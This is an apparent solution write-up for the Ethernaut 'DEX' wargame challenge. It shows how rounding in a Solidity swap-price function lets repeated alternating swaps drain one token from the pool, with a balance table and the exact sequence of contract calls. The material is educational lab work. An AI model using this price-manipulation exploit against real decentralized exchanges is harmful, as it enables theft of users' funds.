# Solution to challenge 22 : DEX

Our goal here is to drain all of at least 1 of the 2 tokens from the contract. 

The functions `setTokens()` and `addLiquidity()` can't be exploited because they are protected by the modifier `onlyOwner`.

The vulnerability is within the `getSwapPrice()` function, calculating the ``tokenAmount`` :

![](https://github.com/Kuqow/ethernaut-solutions-Kuqow/blob/main/Pictures/DEX.png)

In Solidity, **the division rounds to zero**, thus we can progressively decrease the balance of one selected token by doing multiple swaps. Let's see how many swaps are required :

```
DEX TOKEN-1    DEX TOKEN-2   |  USER TOKEN-1    USER TOKEN-2  |  SWAP TOKEN CALC
----------------------------------------------------------------------------------
	100           100              10               10              10
	110            90               0               20              24 (24.44)
	 86           110              24                0              30 (30.70)
	110            80               0               30              41 (41.25)
	 69           110              41                0              65 (65.36)
	110            45               0               65              158 (158.88)
	  0            90             110               20              X
```        

For the last swap, we need to calculate the exact amount, otherwise the `transferFrom()` will fail. 
At this point the token amount calculation returns **158 (65\*110/45)** :

- For **65** TOKEN-2  we can get **158** TOKEN-1
- How many TOKEN-2 do we need to receive exactly **110** TOKEN-1 ? 65\*110/158 = 45
- Meaning that we need to swap **45** TOKEN-2 in order to receive 110 **TOKEN**-1 and completely drain the pool to **0 TOKEN-1**

Summary of steps :

1. Approve the spending of tokens : `contract.approve(instance, 1000)`, approve a big amount so you don't have to approve it again later
2. Swap `contract.swap(AddrTOKEN1, AddrTOKEN2, 10)`
3. Swap `contract.swap(AddrTOKEN2, AddrTOKEN1, 20)`
4. Swap `contract.swap(AddrTOKEN1, AddrTOKEN2, 24)`
5. Swap `contract.swap(AddrTOKEN2, AddrTOKEN1, 30)`
6. Swap `contract.swap(AddrTOKEN1, AddrTOKEN2, 41)`
7. Swap `contract.swap(AddrTOKEN2, AddrTOKEN1, 45)`
8. Submit the instance !